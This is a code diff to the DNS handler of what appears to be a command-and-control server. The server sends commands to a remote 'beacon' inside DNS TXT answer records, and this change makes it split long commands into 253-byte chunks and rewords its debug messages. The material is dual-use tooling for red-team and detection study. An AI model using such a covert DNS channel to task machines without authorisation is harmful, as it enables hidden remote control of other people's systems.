@@ -49,8 +49,7 @@ class DNSHandler(ProtocolHandler):
                 # Issue a SYNC-REQUEST if server went down and needs to resync
                 self._send_control(request, port, "SYNC-REQUEST")
         except DNSError:
-            self.logger.debug("Incorrectly formatted DNS Query. Skipping")
-            self._send_control(request, port, "SYNC-FAILURE")
+            self.logger.debug(f"[{self.ip}] synchronize: Packet Malformed")
         return ""
 
     def encrypt(self, raw_request, port, key):
@@ -71,11 +70,12 @@ class DNSHandler(ProtocolHandler):
                     return 2
             else:
                 # Return back to SYNC state, will perform SYNC-REQUEST
-                self.logger.debug(f"{self.ip}: Falling back to SYNC")
+                self.logger.debug(f"{self.ip}: Client not in ENCRYPT. Falling back to SYNC")
                 return 0
 
-        except DNSError:
-            self.logger.debug(f"[{self.ip}] DNS Packet Malformed")
+        except DNSError as e:
+            self.logger.debug(f"[{self.ip}] encrypt: DNS Packet Malformed: {str(e)}")
+
         return 0
 
     def respond(self, raw_request, port, cmd):
@@ -90,7 +90,7 @@ class DNSHandler(ProtocolHandler):
             query = str(q.get_qname()).split(".")[::-1]
             if query[3] != Domains.QUERY.value:
                 # Return back to SYNC state, will perform SYNC-REQUEST
-                self.logger.debug(f"{self.ip}: Falling back to SYNC")
+                self.logger.debug(f"{self.ip}: Client not in QUERY. Falling back to SYNC")
                 return 0
             
             # If opcode is a normal QUERY then procede
@@ -111,37 +111,40 @@ class DNSHandler(ProtocolHandler):
                 pass
             else:
                 pass
-        except DNSError:
-            self.logger.debug(f"[{self.ip}] DNS Packet Malformed")
-        return 0
+        except DNSError as e:
+            self.logger.debug(f"[{self.ip}] respond: DNS Packet Malformed: {str(e)}")
+        return 2
 
     def _send_command(self, request: DNSRecord, port: int, command: Command):
         """
         A helper function used to send command packets to the Resolution client
+        This currenty only works with TXT records
         """
-        opcode = command.type
+        #opcode = command.type
         cmd = command.command
         # get the type of record this beacon is ready to receive
         rr_type, rr_constructor = self.record_type.value
         # Generate skeleton question for packet
         command_packet = request.reply()
-        # Generate the response to the question
-        command_packet.add_answer(
-            RR(
-                rname=request.get_q().get_qname(),
-                rtype=rr_type,
-                rclass=CLASS.IN,
-                rdata=rr_constructor(f"1:{cmd}"),
-                ttl=1337))
+        # chunk the responses in 255 byte values in accordance with RFC
+        chunks = [f"1:{cmd[i:i+253]}" for i in range(0, len(cmd), 253)] 
+        for chunk in chunks:
+            self.logger.debug(chunk)
+            answer = RR(
+                    rname=request.get_q().get_qname(),
+                    rtype=rr_type,
+                    rclass=CLASS.IN,
+                    rdata=rr_constructor(chunk),
+                    ttl=1337)
+            command_packet.add_answer(answer)
         # send command
         self.socket.sendto(command_packet.pack(), (self.ip, port))
-        if command.type != CommandType.NOP:
-            self.logger.info(f"{self.ip}: {cmd} Sent")
+        self.logger.info(f"{self.ip}: {cmd} Sent")
 
 
     def _send_control(self, request: DNSRecord, port: int, control: str):
         """
-        A helper function used to send control packets to the Resolution client
+        A helper function used to send control packets to the Resolution client.
         """
         # get the type of record this beacon is ready to receive
         rr_type, rr_constructor = self.record_type.value
